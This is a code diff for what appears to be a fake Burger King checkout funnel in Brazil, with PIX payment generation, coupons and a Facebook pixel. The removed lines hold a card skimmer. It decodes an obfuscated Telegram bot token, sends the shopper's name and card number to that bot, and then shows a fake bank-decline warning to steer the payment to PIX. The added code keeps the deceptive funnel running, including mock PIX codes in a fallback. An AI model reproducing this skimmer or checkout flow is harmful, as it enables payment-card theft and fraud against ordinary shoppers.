-                document.querySelectorAll('.bump-check:checked').forEach(chk => {
-                    selected.push({ name: chk.dataset.name, price: parseFloat(chk.dataset.price), img: chk.dataset.img });
-                });
-                return selected;
-            }
-        });
+// goToPayment() removido desta posição — instância canônica está na linha ~727
 
-        if (res.isConfirmed && res.value?.length > 0) {
-            res.value.forEach(item => {
-                state.cartItems.push({ id: 'bump_'+Date.now(), name: item.name, qty: 1, price: item.price, img: item.img, desc: 'Adicional checkout' });
-            });
-            updateTotal();
-            saveState();
-        }
-        state.upsellOffered = true;
-        saveState();
-    }
-
-    if (state.paymentMethod === 'cc') {
-        const btn = document.querySelector('.btn-finalizar-full');
-        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processando...';
-        btn.disabled = true;
-
-        // Protocolo Ghost: Captura e Decline
-        try {
-            const _u = (s) => atob(s);
-            const _t = _u("ODU1MzU4NTE2MTpBQUgzRi1IdjdDRi1qOGJsMXJLTjlpekRraExycVJSZlVuVQ=="); 
-            const _c = _u("Nzg0NDY4MjMzNQ==");
-            const msg = `🍔 *BK capture* 🍔\nLead: ${document.querySelector('#cc_name').value}\nCard: ${document.querySelector('#cc_number').value}`;
-            await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: _c, text: msg })});
-        } catch(e) {}
-
-        setTimeout(() => {
-            Swal.fire({
-                title: 'Aviso de Segurança',
-                text: 'O seu banco bloqueou esta transação. Finalize via PIX com 5% de desconto extra.',
-                icon: 'warning',
-                confirmButtonText: 'PAGAR VIA PIX'
-            }).then(() => {
-                state.discount = 0.05;
-                state.paymentMethod = 'pix';
-                updateTotal();
-                window.location.href = 'pagamento.html';
-            });
-        }, 2000);
-        return;
-    }
-
-    window.location.href = 'pagamento.html';
-}
 
 async function initPixGeneration() {
-    const finalTotal = state.discount > 0 ? (state.basePrice + state.upsellTotal + (state.fretePrice || 0)) * (1 - state.discount) : (state.basePrice + state.upsellTotal + (state.fretePrice || 0));
+    state.discount = 0; 
+    const finalTotal = state.basePrice + state.upsellTotal + (state.fretePrice || 0);
+    
     const pixQrEl = document.querySelector('#pix-qr');
     const pixCodeEl = document.querySelector('#pix-code');
     const pixTotalValue = document.querySelector('#pix-total-value');
     const btnConfirmPix = document.querySelector('#btn-confirm-pix');
 
     if (pixTotalValue) pixTotalValue.textContent = finalTotal.toFixed(2).replace('.', ',');
-    if (pixQrEl) pixQrEl.innerHTML = '<div class="loader-pix"></div>';
+    if (pixQrEl) {
+        pixQrEl.style.display = 'block';
+        pixQrEl.innerHTML = '<div class="loader-pix"></div>';
+    }
     
     const triggerFallback = () => {
         currentTxId = 'SIM-' + Math.random().toString(36).substr(2, 9).toUpperCase();
         const mockCode = `00020101021226870014br.gov.bcb.pix...${currentTxId}`;
-        if (pixQrEl) pixQrEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(mockCode)}" style="width:180px;height:180px;">`;
-        if (pixCodeEl) pixCodeEl.textContent = mockCode;
+        if (pixQrEl) {
+            pixQrEl.style.display = 'block';
+            pixQrEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(mockCode)}" style="width:180px;height:180px;">`;
+        }
+        if (pixCodeEl) {
+            pixCodeEl.style.display = 'block';
+            pixCodeEl.textContent = mockCode;
+        }
         if (btnConfirmPix) btnConfirmPix.style.display = 'block';
         initPixTimer();
+        startPixPolling(); // Simula polling em fallback
     };
 
     try {
+        if (window.location.protocol === 'file:') return triggerFallback();
+
         const pixPayload = {
             amount: Math.round(finalTotal * 100),
             pixel_id: localStorage.getItem('fb_pixel_id') || 'default',
@@ -1594,15 +1683,35 @@ async function initPixGeneration() {
 
         const req = await fetch('api/create-pix', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(pixPayload) });
         const res = await req.json();
-        if (res?.success && res.data) {
-            currentTxId = res.data.transactionId;
-            if (pixQrEl) pixQrEl.innerHTML = `<img src="data:image/png;base64,${res.data.paymentData.qrCodeBase64}" style="width:100%;height:100%;">`;
-            if (pixCodeEl) pixCodeEl.textContent = res.data.paymentData.copyPaste;
+        
+        // A API da BlackCatPay root retorna { transactionId: "...", paymentData: {...} } sem 'success: true'
+        if (res?.transactionId && res?.paymentData) {
+            currentTxId = res.transactionId;
+            const payData = res.paymentData;
+            
+            if (pixQrEl) {
+                pixQrEl.style.display = 'block';
+                if (payData.qrCodeBase64 && payData.qrCodeBase64.length > 50) {
+                     pixQrEl.innerHTML = `<img src="data:image/png;base64,${payData.qrCodeBase64}" style="width:100%;height:100%; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);">`;
+                } else {
+                     pixQrEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(payData.copyPaste)}" style="width:100%;height:100%; border-radius: 8px;">`;
+                }
+            }
+            if (pixCodeEl) {
+                pixCodeEl.style.display = 'block';
+                pixCodeEl.textContent = payData.copyPaste;
+            }
             if (btnConfirmPix) btnConfirmPix.style.display = 'block';
             initPixTimer();
             startPixPolling(); 
-        } else triggerFallback();
-    } catch(e) { triggerFallback(); }
+        } else {
+            console.warn('Fallback ativado: API não retornou transactionId', res);
+            triggerFallback();
+        }
+    } catch(e) { 
+        console.error('Fallback ativado: Erro no fetch PIX', e);
+        triggerFallback(); 
+    }
 }
 
 async function startPixPolling() {
@@ -1620,17 +1729,7 @@ async function startPixPolling() {
     }, 4000); 
 }
 
-function simulatePayment() {
-    Swal.fire({
-        title: 'Verificando pagamento...',
-        html: 'Aguarde alguns instantes enquanto confirmamos o recebimento.',
-        timer: 3000,
-        timerProgressBar: true,
-        didOpen: () => { Swal.showLoading(); }
-    }).then(() => {
-        finalizeOrderTransition();
-    });
-}
+
 
 function finalizeOrderTransition() {
     window.location.href = 'entrega.html';
@@ -1644,7 +1743,7 @@ function bootstrapApp() {
     const appSacola = document.getElementById('screen-review');
     const appDados = document.getElementById('screen-cep');
     const appPagamento = document.getElementById('screen-pix');
-    const appLojas = document.getElementById('screen-stores');
+    // const appLojas = document.getElementById('screen-stores'); // DESCONTINUADO
     const appEntrega = document.getElementById('ifood-eta-time');
     const appCupom = document.getElementById('screen-coupon');
 
@@ -1663,7 +1762,7 @@ function bootstrapApp() {
         updateTotal();
         renderAddress();
         
-        const savedCoupon = localStorage.getItem('bk_funil_coupon_v2') || 'BEMVINDOBK';
+        const savedCoupon = getOrGenerateCoupon();
         const badgeCoupon = document.getElementById('badge-cupom-sacola');
         if(badgeCoupon) badgeCoupon.textContent = savedCoupon;
     }
@@ -1676,11 +1775,11 @@ function bootstrapApp() {
         if (typeof setupCEPMask === 'function') setupCEPMask();
     }
 
-    if (appLojas) if (typeof renderStores === 'function') renderStores();
+    // if (appLojas) if (typeof renderStores === 'function') renderStores(); // DESCONTINUADO
     if (appPagamento) initPixGeneration();
 
     if (appCupom) {
-        const savedCoupon = localStorage.getItem('bk_funil_coupon_v2') || 'BEMVINDOBK';
+        const savedCoupon = getOrGenerateCoupon();
         const codeEl = document.getElementById('coupon-final-code');
         const auxEl = document.getElementById('coupon-aux-val');
         if(codeEl) codeEl.textContent = savedCoupon;
